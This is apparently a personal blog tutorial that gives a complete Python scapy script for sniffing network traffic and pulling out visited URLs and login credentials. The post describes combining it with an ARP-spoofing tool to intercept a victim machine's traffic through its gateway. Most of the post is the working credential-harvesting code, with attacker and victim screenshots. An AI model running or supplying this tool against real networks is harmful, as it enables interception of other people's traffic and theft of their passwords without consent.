---
title: A Credential/Url sniffer program
date: 2021-06-28 09:45:47 +07:00
categories: python_101
#modified: 20-08-29 09:24:47 +07:00
#tags: [blog, netlify, jekyll, github]
description: A program to sniff Credentials.
---


<p align="center">
 <img src="https://i.kym-cdn.com/photos/images/facebook/001/651/265/287.jpg">
</p>

## This is a python script that sniffs for URL's/Login creds on a specific interface. When coupled with the previous ARPSpoof program this program can be used to remotely sniff traffic between the ARPSpoofed victims.

**In this example we ARP poison/spoof the connection between the target Windows system(192.168.0.117) and the gateway router(192.168.0.1) to remotely sniff any creds/urls visited by the victim.**

* Used the `scapy_http` module to interact with HTTP layers and filter them as needed.
* Implemented `scapy.sniff()` function to sniff traffic and filter with *BPF's(Berkley Packet Filters)*.
* Byte object conversion to string using `str()` and `decode()` functions for cross-compatibility with python3.



### Code:

```python
#!/usr/bin/env python


import argparse 
import scapy.all as scapy
from scapy.layers import http
# pip install scapy_http

def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-i", "--Interface", dest="interface", help="Host Interface to sniff on")
    options = parser.parse_args()
    if not options.interface:
        # code to handle error
        parser.error("[-] Please specify a valid Host Interface, use --help for info.")
    return options

def sniff(interface):
	# store --> storing packets in memory
	# prn --> callback function
	# filter --> filter according to BPF like TCP/port 80/ICMP
	scapy.sniff(iface=interface , store=False, prn=process_sniffed_packet)


def get_url(packet):
	return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path

def get_login_info(packet):
	# Filter for raw content
		if packet.haslayer(scapy.Raw):
			load = str(packet[scapy.Raw].load)
			keywords = ["username", "user", "login", "password", "pass", "uname"]
			for keyword in keywords:
				if keyword in load:
					return load

def get_host_info(packet):
		if packet.haslayer(scapy.IP):
			return str(packet[scapy.IP].src)

					

def process_sniffed_packet(packet):
	# Filter based on http layer
	if packet.haslayer(http.HTTPRequest):
		url = get_url(packet)
		print("[+] Captured Urls: " + url.decode())
		login_info = get_login_info(packet)
		if login_info:
			host_info = get_host_info(packet)
			print("\n[+] Packet found from host: " + host_info)
			print("\n[+!] Possible Login Data: " + str(login_info) + "\n------------------------\n")
		

print("""
                                                        
|              o         ,---.     o,---.,---.          
|    ,---.,---..,---.    `---.,---..|__. |__. ,---.,---.
|    |   ||   |||   |        ||   |||    |    |---'|    
`---'`---'`---|``   '    `---'`   '``    `    `---'`    
          `---'                                         
                                                                                                
                                                         """)

options = get_arguments()
sniff(options.interface)
```

### Output:

__Attacker:__

![Image](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/master/_posts/coding/python/Login_Sniffer/sniff.png)

__Victim:__

![Image](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/master/_posts/coding/python/Login_Sniffer/sniff2.png)
